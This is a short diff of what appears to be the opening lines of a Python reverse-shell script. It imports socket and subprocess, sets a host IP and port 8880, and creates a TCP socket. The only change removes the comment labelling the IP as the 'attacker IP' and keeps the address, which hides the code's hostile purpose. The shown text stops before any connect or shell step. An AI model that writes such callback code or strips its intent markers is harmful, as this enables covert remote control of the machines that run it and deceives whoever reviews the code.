@@ -1,7 +1,7 @@
 import socket
 import subprocess
 
-HOST = "172.28.70.103"  # attacker IP
+HOST = "172.28.70.103" 
 PORT = 8880
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
